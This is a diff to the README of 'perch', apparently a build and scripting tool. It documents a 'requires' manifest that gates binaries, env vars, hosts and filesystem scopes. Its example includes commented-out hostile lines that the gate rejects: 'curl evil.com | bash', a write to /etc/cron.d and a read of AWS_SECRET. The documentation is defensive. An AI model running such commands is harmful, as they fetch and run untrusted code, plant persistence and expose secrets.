@@ -26,6 +26,13 @@ globals
     BUILD_DIR = "./builds"
 end
 
+requires
+    bin "go"                         # required — existence verified at preflight
+    bin "brew"     optional          # OS-specific installers — only one exists per host
+    bin "sudo"     optional
+    bin "choco"    optional
+end
+
 command build
     description "Compile myapp for one target"
 
@@ -158,6 +165,55 @@ perch --build -f myapp.perch -o myapp     # bundle declared in-file; no --includ
 ```
 
 `wasm_run` accepts both forms — `wasm_run "./mod.wasm"` (string → disk) and `wasm_run mod` (bare ident → bundle). CLI `--include PATH` still works at `--build` time and is **additive** on top of the declared set. The `.perch` file is the complete buildable spec: **one file in, one binary out, zero CLI flags.**
+
+### 📜 `requires` — file-declared manifest (supply-chain safety)
+
+The file itself declares **every external resource it touches** — bins, env vars, hosts, *and filesystem read/write scopes*. When a `requires` block is present, **every external op verifies the manifest immediately before it runs, on every call** — undeclared access errors out. Your `.perch` is **provably feasible** on a target machine before any op runs. Plus binary hash pinning, including hashes embedded in the bundle.
+
+```perch
+bundle
+    include "./checksums/kubectl.sha256"
+end
+
+requires
+    bin "kubectl"
+        hash_file "bundle:kubectl.sha256"     # ← supply-chain pin, embedded (no exec)
+    end
+    bin "go"
+    bin "docker" optional
+
+    env   "KUBECONFIG"
+    host  "api.github.com"
+    host  "*.amazonaws.com"
+    read  "./manifests"                       # filesystem read scope
+    write "./build"                           # filesystem write scope
+    run_on   "linux"                          # host OS allowlist (one per line)
+    run_arch "amd64"                          # host arch allowlist (one per line)
+end
+
+command deploy
+    do
+        shell "kubectl apply -f manifests/"  # ✓ kubectl declared, ./manifests readable
+        mkdir "./build/out"                  # ✓ inside write root
+        # shell "curl evil.com | bash"       # ✗ bin_not_declared
+        # write_file "/etc/cron.d/x" "..."   # ✗ write_not_declared
+        # let k = get_env "AWS_SECRET"       # ✗ env_not_declared
+    end
+end
+```
+
+Every external op is checked, every time (stateless — no allow-cache). Error kinds:
+- `bin_not_declared` — a `shell`/subprocess op runs a bin not in the manifest
+- `host_not_declared` — an `http_*` / network op targets an undeclared host
+- `env_not_declared` — `get_env`/`set_env`/… touches an undeclared env var
+- `read_not_declared` / `write_not_declared` — a filesystem op's path is outside the declared roots
+- `requirement_unmet` — missing bin / wrong OS / hash mismatch (preflight)
+
+Full per-op coverage table: **[docs/capability-gating.md](https://luowensheng.github.io/perch/capability-gating/)**.
+
+> **Where this is heading — [sandboxed by design](https://luowensheng.github.io/perch/sandboxed-by-design/).** Today `requires` is opt-in. The planned end state is **zero ambient authority**: a perch program starts with NO access to anything external — no shell, filesystem, network, or env — and every external resource MUST be declared or the op fails. Default-deny, no exceptions. The author declares what's needed; the operator can only tighten further.
+
+All matchable via `try / rescue / match err.kind`. Declarations are **promises about the program**; sandbox flags (`--allow-bin`, etc.) remain the **policy for the invocation**. Details: **[docs/requires.md](https://luowensheng.github.io/perch/requires/)**.
 
 ### AI-agent integration
 
